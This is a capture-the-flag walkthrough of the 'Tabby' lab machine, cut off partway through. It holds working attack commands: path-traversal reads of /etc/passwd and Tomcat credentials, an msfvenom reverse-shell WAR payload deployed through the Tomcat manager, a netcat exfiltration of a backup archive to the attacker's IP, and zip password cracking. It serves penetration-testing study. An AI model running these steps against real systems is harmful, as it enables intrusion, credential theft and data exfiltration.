I"´÷<blockquote>
  <p>Tabby was a user friendly easy level box put together with interesting attack vectors. We start off with discovering Local File Inclusion (LFI) in a website and leverage it to expose credentials for the tomcat server hosted on a different port. Then we exploit tomcat in a rather peculiar way using command line to upload malicious WAR file and execute it drop us a reverse shell. Next we crack password of a zip archive and re-use this password to gain access to next user, this user happens to be a member of LXD group, abusing this group permission we start a privileged container to gain root.</p>
</blockquote>

<h2 id="reconnaissance">Reconnaissance</h2>

<h4 id="masscan">masscan</h4>

<p>Starting off with <code class="language-plaintext highlighter-rouge">masscan</code> we see three open ports 22, 80 and 8080:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span><span class="nb">sudo </span>masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,U:1-65535 <span class="nt">--rate</span> 500 10.10.10.194 | <span class="nb">tee </span>masscan.ports
Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-11-05 12:43:30 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.194                                  
Discovered open port 22/tcp on 10.10.10.194                                    
Discovered open port 80/tcp on 10.10.10.194                                    

coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span><span class="nb">cat </span>masscan.ports | <span class="nb">grep </span>tcp | <span class="nb">sed </span>s/<span class="s1">'Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
8080,22,80,

</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="nmap">Nmap</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p8080</span>,22,80 10.10.10.194
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-05 18:24 IST
Nmap scan report <span class="k">for </span>10.10.10.194
Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 <span class="o">(</span>RSA<span class="o">)</span>
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.75 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Based on the scan results weâ€™ve the following summary:</p>

<ul>
  <li>Port 22: SSH</li>
  <li>Port 80: HTTP service on Apache 2.4.41 with Mega Hosting banner</li>
  <li>Port 8080: Apache Tomcat</li>
</ul>

<h3 id="port-80-website">Port 80: Website</h3>

<p>Visiting <a href="http://10.10.10.194">http://10.10.10.194</a> it appears we have a site of server hosting organization:</p>

<p><img src="/assets/img/Posts/Tabby/website.png" alt="website" /></p>

<p>Going through the site, majority of the page links are non-functional however, we do see the <code class="language-plaintext highlighter-rouge">NEWS</code> which is redirecting to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a></p>

<p>To visit this link, letâ€™s first add the <code class="language-plaintext highlighter-rouge">megahosting.htb</code> to hosts file:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
10.10.10.194    megahosting.htb
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="news">NEWS</h4>

<p>Looking at the News page <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a> , we see a statement about data breach and hence news tool has been removed.</p>

<p><img src="/assets/img/Posts/Tabby/news.png" alt="news" /></p>

<h4 id="web-fuzzing">Web Fuzzing</h4>

<p>Before going ahead, Using <code class="language-plaintext highlighter-rouge">ffuf</code> letâ€™s fuzz the website for hidden files and directories</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~<span class="nv">$ </span>ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.194/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt <span class="nt">-fc</span> 403                                                           

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\                                                                                                                                                        
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                       
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                        
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                        

       v1.1.0                                                                                                                                                                                  
________________________________________________                                                                                                                                               

 :: Method           : GET                                                                                                                                                                     
 :: URL              : http://10.10.10.194/FUZZ                                                                                                                                                
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt                                                                                                    
 :: Follow redirects : true                                                                                                                                                                    
 :: Calibration      : false                                                                                                                                                                   
 :: Timeout          : 10                                                                                                                                                                      
 :: Threads          : 40                                                                                                                                                                      
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                                                            
 :: Filter           : Response status: 403                                                                                                                                                    
________________________________________________                                                                                                                                               

favicon.ico             [Status: 200, Size: 759, Words: 8, Lines: 2]                                                                                                                           
index.php               [Status: 200, Size: 14175, Words: 2135, Lines: 374]                                                                                                                    
:: Progress: [4658/4658]_:: Job [1/1] :: 358 req/sec :: Duration: [0:00:13] :: Errors: 0 ::       
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Unfortunately we donâ€™t see anything useful.</p>

<h3 id="port-8080-tomcat">Port 8080: Tomcat</h3>

<p>Visiting the page we see Tomcatâ€™s default successful installation summary page.</p>

<p><img src="/assets/img/Posts/Tabby/tomcat.png" alt="tomcat" /></p>

<p>On the page we do see links to <code class="language-plaintext highlighter-rouge">manager-webapp</code> &amp; <code class="language-plaintext highlighter-rouge">host-manager webapp</code>, both of which resulting in displaying authentication form pop up. Apart from this we do see a reference of userâ€™s definition inside tomcat.</p>

<h2 id="lfi">LFI</h2>

<h3 id="testing-lfi">Testing LFI</h3>

<p>Going back to the <code class="language-plaintext highlighter-rouge">NEWS</code> page, if we observe the link <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>, itâ€™s using <code class="language-plaintext highlighter-rouge">file</code> argument to read the file which is a good sign, we can check for Local File Inclusion vulnerability.</p>

<p>First weâ€™ll try to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> with path traversal to confirm the vulnerability. Usually I would do this in burp or in browser but here letâ€™s do it with <code class="language-plaintext highlighter-rouge">curl</code></p>

<blockquote>
  <p>Note: While doing this inside browser just view the source of the page for better output format</p>
</blockquote>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby$ curl http://megahosting.htb/news.php?file=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Great ! Now letâ€™s try to read any other sensitive file potentially exposing credentials.</p>

<h3 id="fetching-tomcat-creds">Fetching Tomcat Creds</h3>

<p>Tomcat page on port 8080 said <code class="language-plaintext highlighter-rouge">Users are defined in /etc/tomcat9/tomcat-users.xml</code></p>

<p><code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> is the file where ideally tomcat credentials are stored, so itâ€™s pretty obvious that the next file to read.</p>

<p>First weâ€™ll look into <code class="language-plaintext highlighter-rouge">etc/tomcat9/tomcat-users.xml</code> but unfortunately it doesnâ€™t return anything.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>curl http://megahosting.htb/news.php?file<span class="o">=</span>../../../../../../etc/tomcat9/tomcat-users.xml
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Possibly we are not looking in the right directory, so letâ€™s install tomcat9 on our machine with <code class="language-plaintext highlighter-rouge">apt install tomcat9</code> and search for <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> locally using <code class="language-plaintext highlighter-rouge">find</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~<span class="nv">$ </span>find / <span class="nt">-name</span> tomcat-users.xml 2&gt;/dev/null
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It appears the file is also located inside <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/tomcat-users.xml</code>, on checking the new path we got a result:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby$ curl http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml                                                                  
<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>                                                                                                                                                         
<span class="c">&lt;!--                                                                                                                                                                                           
  Licensed to the Apache Software Foundation (ASF) under one or more                                                                                                                           
  contributor license agreements.  See the NOTICE file distributed with                                                                                                                        
  this work for additional information regarding copyright ownership.                                                                                                                          
  The ASF licenses this file to You under the Apache License, Version 2.0                                                                                                                      
  (the "License"); you may not use this file except in compliance with                                                                                                                         
  the License.  You may obtain a copy of the License at                                                                                                                                        

      http://www.apache.org/licenses/LICENSE-2.0                                                                                                                                               

  Unless required by applicable law or agreed to in writing, software                                                                                                                          
  distributed under the License is distributed on an "AS IS" BASIS,                                                                                                                            
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.                                                                                                                     
  See the License for the specific language governing permissions and                                                                                                                          
  limitations under the License.                                                                                                                                                               
--&gt;</span>                                                                                                                                                                                            
<span class="nt">&lt;tomcat-users</span> <span class="na">xmlns=</span><span class="s">"http://tomcat.apache.org/xml"</span>                                                                                                                                             
              <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>                                                                                                                            
              <span class="na">xsi:schemaLocation=</span><span class="s">"http://tomcat.apache.org/xml tomcat-users.xsd"</span>                                                                                                               
              <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>                                                                                                                                                                   
<span class="c">&lt;!--                                                                                                                                                                                           
  NOTE:  By default, no user is included in the "manager-gui" role required                                                                                                                    
  to operate the "/manager/html" web application.  If you wish to use this app,                                                                                                                
  you must define such a user - the username and password are arbitrary. It is                                                                                                                 
  strongly recommended that you do NOT use one of the users in the commented out                                                                                                               
  section below since they are intended for use with the examples web                                                                                                                          
  application.                                                                                                                                                                                 
--&gt;</span>                                                                                                                                                                                            
<span class="c">&lt;!--                                                                                                                                                                                           
  NOTE:  The sample user and role entries below are intended for use with the                                                                                                                  
  examples web application. They are wrapped in a comment and thus are ignored                                                                                                                 
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
  them. You will also need to set the passwords to something appropriate.
--&gt;</span>
<span class="c">&lt;!--
  &lt;role rolename="tomcat"/&gt;
  &lt;role rolename="role1"/&gt;
  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;
  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;
  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;
--&gt;</span>
   <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"admin-gui"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager-script"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"tomcat"</span> <span class="na">password=</span><span class="s">"$3cureP4s5w0rd123!"</span> <span class="na">roles=</span><span class="s">"admin-gui,manager-script"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/tomcat-users&gt;</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Bingo ! We have credentials as <code class="language-plaintext highlighter-rouge">tomcat:$3cureP4s5w0rd123!</code> with the roles to access <code class="language-plaintext highlighter-rouge">admin-gui</code> and <code class="language-plaintext highlighter-rouge">manager-script</code></p>

<h2 id="shell-as-tomcat">Shell as tomcat</h2>

<h3 id="access-failures">Access Failures</h3>

<p>Even with creds we are unable to access <code class="language-plaintext highlighter-rouge">Tomcat Manager</code> :</p>

<p><img src="/assets/img/Posts/Tabby/error.png" alt="error" /></p>

<p>It appears manager gui is only accessible through the browser from the same machine as Tomcat.</p>

<h3 id="manager-script-access">Manager-Script Access</h3>

<p>As per XML file, our user also has another role as <code class="language-plaintext highlighter-rouge">manager-script</code>, this access allows tomcat users to deploy applications via text base service located at <code class="language-plaintext highlighter-rouge">/manager/text</code></p>

<p>There is a link to docs <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_OS_and_JVM_Properties"><strong>manager support page</strong></a> on the home page of 8080 which gives detail explanation on the usage of text manager access, letâ€™s use <code class="language-plaintext highlighter-rouge">serverinfo</code> command to test this privilege:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>curl <span class="nt">-u</span> <span class="s1">'tomcat:$3cureP4s5w0rd123!'</span> http://10.10.10.194:8080/manager/text/serverinfo
OK - Server info
Tomcat Version: <span class="o">[</span>Apache Tomcat/9.0.31 <span class="o">(</span>Ubuntu<span class="o">)]</span>
OS Name: <span class="o">[</span>Linux]
OS Version: <span class="o">[</span>5.4.0-31-generic]
OS Architecture: <span class="o">[</span>amd64]
JVM Version: <span class="o">[</span>11.0.7+10-post-Ubuntu-3ubuntu1]
JVM Vendor: <span class="o">[</span>Ubuntu]

</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="deploying-malicious-app">Deploying Malicious App</h3>

<h4 id="payload-creation">Payload Creation</h4>

<p>Now that we are able to access Tomcat manager, we can create a malicious war application to deploy it.</p>

<p>Weâ€™ll use <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate malicious WAR payload which returns reverse shell.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.9 <span class="nv">LPORT</span><span class="o">=</span>8020 <span class="nt">-f</span> war <span class="o">&gt;</span> cfx.war  
Payload size: 1097 bytes
Final size of war file: 1097 bytes
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="deploy-payload">Deploy Payload</h4>

<p>With reference to the <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely"><strong>manager support page</strong></a>, letâ€™s deploy our malicious war payload using Text based manager.</p>

<p><img src="/assets/img/Posts/Tabby/text.png" alt="text" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>curl <span class="nt">-u</span> <span class="s1">'tomcat:$3cureP4s5w0rd123!'</span> <span class="nt">-T</span> <span class="s2">"cfx.war"</span> <span class="s2">"http://10.10.10.194:8080/manager/text/deploy?path=/coldfx"</span>
OK - Deployed application at context path <span class="o">[</span>/coldfx]

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Next, On triggering the application using <code class="language-plaintext highlighter-rouge">curl http://10.10.10.194:8080/coldfx/</code> we get a call back on our <code class="language-plaintext highlighter-rouge">pwncat</code> listener:</p>

<h4 id="shell">Shell</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>pwncat <span class="nt">-l</span> 8020 <span class="nt">-vv</span>
INFO: Listening on :::8020 <span class="o">(</span>family 10/IPv6, TCP<span class="o">)</span>
INFO: Listening on 0.0.0.0:8020 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
INFO: Client connected from 10.10.10.194:55452 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>997<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>997<span class="o">(</span>tomcat<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>997<span class="o">(</span>tomcat<span class="o">)</span>
which python3
/usr/bin/python3
python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
tomcat@tabby:/var/lib/tomcat9<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
tomcat@tabby:/var/lib/tomcat9<span class="nv">$ </span><span class="nb">whoami
</span>tomcat

</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="elevating-priv-tomcat---ash">Elevating Priv: Tomcat -&gt; ash</h2>

<h3 id="enumeration">Enumeration</h3>

<p>Initial enumeration reveals user flag is located inside home directory of user <code class="language-plaintext highlighter-rouge">ash</code>.</p>

<p>Hence weâ€™ll search files owned by user ash:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td> --><td class="rouge-code"><pre>tomcat@tabby:~<span class="nv">$ </span>find / <span class="nt">-user</span> ash 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-la</span>
<span class="nt">-rw-r--r--</span> 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip

<span class="nb">ls</span>: cannot open directory <span class="s1">'/home/ash'</span>: Permission denied
/var/www/html/files:
total 36
drwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 Jun 17 16:24 ..
<span class="nt">-rw-r--r--</span> 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive
drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
<span class="nt">-rw-r--r--</span> 1 root root 6507 Jun 16 11:25 statement

</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="decrypting-archive">Decrypting Archive</h3>

<p>There is a <code class="language-plaintext highlighter-rouge">16162020_backup.zip</code> inside /var/www/html/files directory.</p>

<p>The file is encrypted with a password, To examine it better weâ€™ll transfer it to our machine using <code class="language-plaintext highlighter-rouge">nc</code> along with <code class="language-plaintext highlighter-rouge">base64</code> which is safer way for maintaining file integrity.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>tomcat@tabby:/var/www/html/files<span class="nv">$ </span><span class="nb">base64 </span>16162020_backup.zip | nc 10.10.14.9 4444
tomcat@tabby:/var/www/html/files<span class="nv">$ </span><span class="nb">md5sum </span>16162020_backup.zip
f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip

</pre></td></tr></tbody></table></code></pre></div></div>
<p>Receiving the file on our machine, also confirming the integrity of the file by comparing md5 hash:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444 | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> 16162020_backup.zip
Listening on 0.0.0.0 4444
Connection received on 10.10.10.194 46686
coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span><span class="nb">md5sum </span>16162020_backup.zip
f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="cracking-hash">Cracking hash</h4>

<p>Weâ€™ll use <code class="language-plaintext highlighter-rouge">zip2john</code> to create the hash in John accessible format:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>zip2john backup.zip <span class="o">&gt;</span> backup.hashes                                                                                                                              
backup.zip/var/www/html/assets/ is not encrypted!                                                                                                                                              
ver 1.0 backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression <span class="nb">type                                                                                          
</span>ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>338, <span class="nv">decmplen</span><span class="o">=</span>766, <span class="nv">crc</span><span class="o">=</span>282B6DE2                                                               
ver 1.0 backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression <span class="nb">type                                                                                           
</span>ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>3255, <span class="nv">decmplen</span><span class="o">=</span>14793, <span class="nv">crc</span><span class="o">=</span>285CC4D6                                                              
ver 1.0 efh 5455 efh 7875 backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>2906, <span class="nv">decmplen</span><span class="o">=</span>2894, <span class="nv">crc</span><span class="o">=</span>2F9F45F                                                                 
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>114, <span class="nv">decmplen</span><span class="o">=</span>123, <span class="nv">crc</span><span class="o">=</span>5C67F19E                                                                  
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>805, <span class="nv">decmplen</span><span class="o">=</span>1574, <span class="nv">crc</span><span class="o">=</span>32DB9CE3                                                               
NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.                                                                                                                     
If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use                                                                                                                       
option <span class="nt">-o</span> to pick a file at a time.                                       
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">john</code> we can crack it easily:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>john backup.hashes <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt                                                                                                           
Using default input encoding: UTF-8                                                                                                                                                            
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>                                                                                                                                                         
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status                                                                                                                                  
admin@it         <span class="o">(</span>backup.zip<span class="o">)</span>                                                                                                                                                                  
1g 0:00:00:04 DONE <span class="o">(</span>2020-11-05 20:29<span class="o">)</span> 0.2336g/s 2419Kp/s 2419Kc/s 2419KC/s adminako123..admin422243                                                                                            
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably                                                                                                                       
Session completed      
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Password is <code class="language-plaintext highlighter-rouge">admin@it</code></p>

<h4 id="zipbreaker">ZipBreaker</h4>

